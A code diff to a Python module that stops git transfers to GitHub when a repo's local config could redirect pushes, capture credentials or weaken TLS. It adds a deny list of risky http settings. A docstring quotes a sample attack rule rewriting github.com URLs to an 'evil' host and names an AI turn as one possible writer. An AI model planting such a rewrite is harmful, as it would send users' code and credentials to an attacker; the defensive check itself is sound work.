@@ -203,17 +203,33 @@ def git_net_env() -> dict:
 def git_net_args() -> list[str]:
     """`-c` options (placed before the git subcommand) that make https to
     github.com authenticate through `gh`, whatever the user's git config
-    says. Empty for the fake: its remotes are file paths."""
+    says. Empty for the fake: its remotes are file paths.
+
+    Command-line `-c` is read LAST, so it beats the repo's own config for the
+    same key: TLS verification is forced on, and the proxy is pinned to what
+    the ENVIRONMENT says (HTTPS_PROXY / https_proxy / ALL_PROXY / all_proxy,
+    git's and libcurl's own order) — so a repo-local `http.proxy` cannot
+    re-route the transfer, while a proxy the user's environment sets keeps
+    working. With no environment proxy, `http.proxy=` (empty) means "no
+    proxy", which is what the environment said. A URL-scoped repo setting
+    (`http.https://github.com/….proxy`) would outrank these generic ones, so
+    `url_rewrites` refuses those outright instead."""
     if _fake() is not None:
         return []
     from fused_render import github_setup
     path, _source = github_setup.resolve()
-    hooks = ["-c", "core.hooksPath=" + os.devnull]
+    proxy = next((os.environ[k] for k in ("HTTPS_PROXY", "https_proxy", "ALL_PROXY", "all_proxy")
+                  if os.environ.get(k)), "")
+    fixed = ["-c", "core.hooksPath=" + os.devnull,
+             "-c", "http.sslVerify=true",
+             "-c", "http.https://github.com/.sslVerify=true",
+             "-c", f"http.proxy={proxy}",
+             "-c", f"http.https://github.com/.proxy={proxy}"]
     if not path:
-        return ["-c", "credential.helper="] + hooks
+        return ["-c", "credential.helper="] + fixed
     return ["-c", "credential.helper=",
             "-c", f"credential.https://github.com.helper=!{shlex.quote(path)} auth git-credential",
-            *hooks]
+            *fixed]
 
 
 def git_auth_args() -> list[str]:
@@ -270,32 +286,77 @@ def url_rewrites(root: str, url: str | None = None) -> list[str]:
     running in the app folder (the app, a Claude turn, a README's
     instructions) can write `url.https://evil/.insteadOf=https://github.com/`
     and every push of Bob's work — with his GitHub credential helper attached
-    — would go there. A rule counts when its prefix mentions github.com, or
-    is a prefix of `url` (the fake's file paths included). Read with
-    `--local --includes`, so a local `[include]` cannot hide one; the
-    command-scope rules tests use (GIT_CONFIG_COUNT) are not local and do not
-    count. `push`/`fetch` refuse when this is non-empty; follow.fetch's
+    — would go there. The same file can also take the credential or the
+    connection: a `credential.*` helper (git hands every helper the token on
+    `store`), or a `http.*` setting that weakens TLS or re-routes the
+    connection. What counts as a hit:
+      * `url.<x>.insteadOf` / `pushInsteadOf` whose prefix mentions github.com
+        or is a prefix of `url` (the fake's file paths included);
+      * any `credential.*` key;
+      * a URL-scoped `http.<u>.<key>` whose `<u>` mentions github.com or
+        prefixes `url` (git prefers it over our command-line generic value);
+      * a generic `http.<key>` in `_HTTP_DENY` (CA, client cert/key, pinned
+        key, extra headers, resolve overrides, cookies, ssl backend, proxy
+        TLS). Generic `http.proxy` / `http.sslVerify` are not refused but
+        OVERRIDDEN on the command line (`git_net_args`).
+
+    EVERY SCOPE THE REPO OWNS: one `config --list --show-scope --includes`
+    under `git_net_env` (global and system already off), keeping `local`
+    and `worktree` entries — so `.git/config`, a `[include]`/`[includeIf]`
+    it pulls in, and `.git/config.worktree` (`extensions.worktreeConfig`)
+    are all seen. The command-scope rules tests use (GIT_CONFIG_COUNT) do
+    not count. `push`/`fetch` refuse when this is non-empty; follow.fetch's
     fallback should ask it too."""
-    res = _git(root, "config", "--local", "--includes", "--get-regexp",
-               r"^url\..*\.(insteadof|pushinsteadof)$", env=_local_env(), timeout=10)
-    if res is None or res.returncode not in (0, 1):
+    res = _git(root, "config", "--list", "--show-scope", "--includes", "-z",
+               env=git_net_env(), timeout=10)
+    if res is None or res.returncode != 0:
         return []
     hits = []
-    for line in (res.stdout or "").splitlines():
-        key, _, value = line.partition(" ")
-        prefix = value.strip()
-        if not prefix:
+    # With -z, `--show-scope` output is `<scope>\0<key>\n<value>\0` per entry.
+    tokens = (res.stdout or "").split("\0")
+    for scope, rest in zip(tokens[0::2], tokens[1::2]):
+        if scope not in ("local", "worktree") or not rest:
             continue
-        if "github.com" in prefix.lower() or (url and url.startswith(prefix)):
-            hits.append(f"{key} = {prefix}")
+        key, _, value = rest.partition("\n")
+        hit = _risky(key.lower(), value.strip(), url)
+        if hit:
+            hits.append(f"{scope}:{key} = {value.strip()}")
     return hits
+
+
+#: Generic `http.<key>`s a repo's own config may never set for a GitHub
+#: transfer (lowercase). Proxy and sslVerify are overridden instead.
+_HTTP_DENY = frozenset({
+    "sslcainfo", "sslcapath", "sslcert", "sslkey", "sslcertpasswordprotected",
+    "sslbackend", "sslcipherlist", "sslversion", "pinnedpubkey", "extraheader",
+    "curloptresolve", "cookiefile", "savecookies", "proxysslcert", "proxysslkey",
+    "proxysslcainfo", "proxysslcertpasswordprotected", "proxyauthmethod",
+    "schannelcheckrevoke", "schannelusesslcainfo", "followredirects",
+})
+
+
+def _risky(key: str, value: str, url: str | None) -> bool:
+    def aims_at_github(prefix: str) -> bool:
+        p = prefix.lower()
+        return "github.com" in p or bool(url and url.lower().startswith(p))
+
+    if key.startswith("credential."):
+        return True
+    if key.startswith("url.") and key.endswith((".insteadof", ".pushinsteadof")):
+        return bool(value) and aims_at_github(value)
+    if key.startswith("http."):
+        middle, _, leaf = key[len("http."):].rpartition(".")
+        if middle:                       # http.<url>.<key>
+            return aims_at_github(middle)
+        return leaf in _HTTP_DENY
+    return False
 
 
 def _guard(root: str, url: str) -> None:
     hits = url_rewrites(root, url)
     if hits:
-        logger.warning("refusing a GitHub transfer from %s: its .git/config rewrites "
-                       "GitHub URLs: %s", root, "; ".join(hits))
+        logger.warning("refusing a GitHub transfer from %s: the repo's own config "
+                       "would redirect it or touch its credential: %s", root, "; ".join(hits))
         raise GitHubError("forbidden", "This app's settings would send your changes "
                                        "somewhere other than GitHub, so nothing was sent.")
 
